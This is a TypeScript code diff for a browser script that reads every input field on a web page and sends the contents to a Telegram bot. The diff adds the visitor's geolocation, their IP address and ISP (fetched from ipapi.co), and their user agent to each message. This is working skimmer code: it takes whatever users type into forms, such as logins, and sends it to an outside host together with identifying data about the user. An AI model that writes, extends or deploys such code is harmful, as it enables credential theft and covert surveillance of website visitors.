@@ -10,7 +10,12 @@ export async function sendPageInputTagsToTelegram(): Promise<void> {
   }
 
   const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'));
-  const message = buildTelegramMessage(inputs);
+  const [location, ipInfo] = await Promise.all([
+    getLocation(),
+    getIPInfo(),
+  ]);
+  const userAgent = navigator.userAgent;
+  const message = buildTelegramMessage(inputs, location, ipInfo, userAgent);
 
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -28,9 +33,16 @@ export async function sendPageInputTagsToTelegram(): Promise<void> {
   }
 }
 
-function buildTelegramMessage(inputs: HTMLInputElement[]): string {
+function buildTelegramMessage(
+  inputs: HTMLInputElement[],
+  location: string,
+  ipInfo: { ip: string; isp: string },
+  userAgent: string
+): string {
+  const header = `Location: ${location}\nIP: ${ipInfo.ip}\nISP: ${ipInfo.isp}\nUser-Agent: ${userAgent}\n\n`;
+
   if (!inputs.length) {
-    return `No <input> tags found on page ${window.location.href}`;
+    return `${header}No <input> tags found on page ${window.location.href}`;
   }
 
   const lines = inputs.map((input, index) => {
@@ -49,5 +61,41 @@ function buildTelegramMessage(inputs: HTMLInputElement[]): string {
     return `${index + 1}. ${props.join(' | ')}`;
   });
 
-  return `Input tags captured on ${window.location.href}:\n${lines.join('\n')}`;
+  return `${header}Input tags captured on ${window.location.href}:\n${lines.join('\n')}`;
+}
+
+async function getLocation(): Promise<string> {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve('Geolocation not supported');
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const { latitude, longitude } = position.coords;
+        resolve(`${latitude}, ${longitude}`);
+      },
+      (error) => {
+        resolve(`Location access denied: ${error.message}`);
+      },
+      { timeout: 10000 }
+    );
+  });
+}
+
+async function getIPInfo(): Promise<{ ip: string; isp: string }> {
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    const data = await response.json();
+    return {
+      ip: data.ip || 'Unknown',
+      isp: data.org || 'Unknown',
+    };
+  } catch (error) {
+    return {
+      ip: 'Failed to fetch',
+      isp: 'Failed to fetch',
+    };
+  }
 }
